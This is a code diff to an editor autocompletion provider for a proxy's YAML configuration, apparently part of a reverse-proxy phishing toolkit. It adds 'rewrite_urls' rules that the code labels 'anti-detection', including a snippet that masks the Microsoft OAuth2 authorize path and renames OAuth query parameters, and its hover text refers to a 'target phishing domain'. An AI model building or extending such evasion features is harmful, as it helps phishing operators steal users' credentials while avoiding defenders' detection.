@@ -112,6 +112,15 @@ export class ProxyYamlCompletionProvider {
 			if (context === 'response') {
 				return this.getNewResponseSuggestions(range);
 			}
+			if (context === 'rewrite_urls') {
+				return this.getNewRewriteUrlsSuggestions(range);
+			}
+			if (
+				context === 'query' &&
+				this.findParentSection(linesAbove, currentIndent - 2) === 'rewrite_urls'
+			) {
+				return this.getNewQueryMappingSuggestions(range);
+			}
 		}
 
 		// Handle field completions based on context
@@ -134,6 +143,14 @@ export class ProxyYamlCompletionProvider {
 				return this.getRewriteSuggestions(range);
 			case 'response':
 				return this.getResponseSuggestions(range);
+			case 'rewrite_urls':
+				return this.getRewriteUrlsSuggestions(range);
+			case 'query':
+				// Check if we're in a rewrite_urls context
+				if (this.findParentSection(linesAbove, currentIndent - 2) === 'rewrite_urls') {
+					return this.getQueryMappingSuggestions(range);
+				}
+				return [];
 			default:
 				return [];
 		}
@@ -167,9 +184,11 @@ export class ProxyYamlCompletionProvider {
 				if (key === 'access') return 'access';
 				if (key === 'capture') return 'capture';
 				if (key === 'rewrite') return 'rewrite';
+				if (key === 'rewrite_urls') return 'rewrite_urls';
 				if (key === 'response') return 'response';
 				if (key === 'on_deny') return 'on_deny';
 				if (key === 'paths') return 'paths';
+				if (key === 'query') return 'query';
 			}
 		}
 
@@ -231,6 +250,13 @@ export class ProxyYamlCompletionProvider {
 				insertText: 'response:',
 				documentation: 'Global response rules',
 				range
+			},
+			{
+				label: 'rewrite_urls',
+				kind: this.monaco.languages.CompletionItemKind.Module,
+				insertText: 'rewrite_urls:',
+				documentation: 'Global URL rewrite rules for anti-detection',
+				range
 			}
 		];
 	}
@@ -270,6 +296,13 @@ export class ProxyYamlCompletionProvider {
 				kind: this.monaco.languages.CompletionItemKind.Module,
 				insertText: 'response:',
 				documentation: 'Domain response rules',
+				range
+			},
+			{
+				label: 'rewrite_urls',
+				kind: this.monaco.languages.CompletionItemKind.Module,
+				insertText: 'rewrite_urls:',
+				documentation: 'Domain URL rewrite rules for anti-detection',
 				range
 			}
 		];
@@ -567,6 +600,97 @@ export class ProxyYamlCompletionProvider {
 		];
 	}
 
+	getRewriteUrlsSuggestions(range) {
+		return [
+			{
+				label: 'find',
+				kind: this.monaco.languages.CompletionItemKind.Property,
+				insertText: 'find: "^/path/to/match$"',
+				documentation: 'Regex pattern to match URL path',
+				range
+			},
+			{
+				label: 'replace',
+				kind: this.monaco.languages.CompletionItemKind.Property,
+				insertText: 'replace: "/new/path"',
+				documentation: 'Replacement path for matched URLs',
+				range
+			},
+			{
+				label: 'query',
+				kind: this.monaco.languages.CompletionItemKind.Module,
+				insertText: 'query:',
+				documentation: 'Query parameter mappings',
+				range
+			},
+			{
+				label: 'filter',
+				kind: this.monaco.languages.CompletionItemKind.Property,
+				insertText: 'filter: ["client_id", "state"]',
+				documentation: 'Query parameters to keep (if empty, keep all)',
+				range
+			}
+		];
+	}
+
+	getNewRewriteUrlsSuggestions(range) {
+		return [
+			{
+				label: 'url rewrite rule',
+				kind: this.monaco.languages.CompletionItemKind.Snippet,
+				insertText:
+					'find: "/common/oauth2/v2\\.0/authorize"\n  replace: "/signin"\n  query:\n    - find: "response_type"\n      replace: "type"\n  filter: ["client_id", "state"]',
+				documentation: 'New URL rewrite rule for anti-detection',
+				range
+			},
+			{
+				label: 'simple path rewrite',
+				kind: this.monaco.languages.CompletionItemKind.Snippet,
+				insertText: 'find: "/original/path"\n  replace: "/new/path"',
+				documentation: 'Simple path rewrite without query changes',
+				range
+			}
+		];
+	}
+
+	getQueryMappingSuggestions(range) {
+		return [
+			{
+				label: 'find',
+				kind: this.monaco.languages.CompletionItemKind.Property,
+				insertText: 'find: "client_id"',
+				documentation: 'Original query parameter name to find',
+				range
+			},
+			{
+				label: 'replace',
+				kind: this.monaco.languages.CompletionItemKind.Property,
+				insertText: 'replace: "app_id"',
+				documentation: 'New query parameter name to replace with',
+				range
+			}
+		];
+	}
+
+	getNewQueryMappingSuggestions(range) {
+		return [
+			{
+				label: 'query mapping',
+				kind: this.monaco.languages.CompletionItemKind.Snippet,
+				insertText: 'find: "client_id"\n  replace: "app_id"',
+				documentation: 'Map query parameter names for anti-detection',
+				range
+			},
+			{
+				label: 'oauth parameter mapping',
+				kind: this.monaco.languages.CompletionItemKind.Snippet,
+				insertText: 'find: "response_type"\n  replace: "type"',
+				documentation: 'Common OAuth parameter mapping',
+				range
+			}
+		];
+	}
+
 	getModeSuggestions(range) {
 		return [
 			{
@@ -824,7 +948,10 @@ export class ProxyYamlCompletionProvider {
 			action: 'DOM action: setText, setHtml, setAttr, removeAttr, addClass, removeClass, remove',
 			target:
 				'Target matching: "first", "last", "all" (default), "1,3,5" (specific), "2-4" (range)',
-			to: 'Target phishing domain for this original domain'
+			to: 'Target phishing domain for this original domain',
+			rewrite_urls: 'URL rewrite rules for anti-detection - changes paths and query parameters',
+			query: 'Query parameter mappings for URL rewriting',
+			filter: 'Query parameters to keep (if empty, keep all)'
 		};
 
 		return hoverData[word] || null;
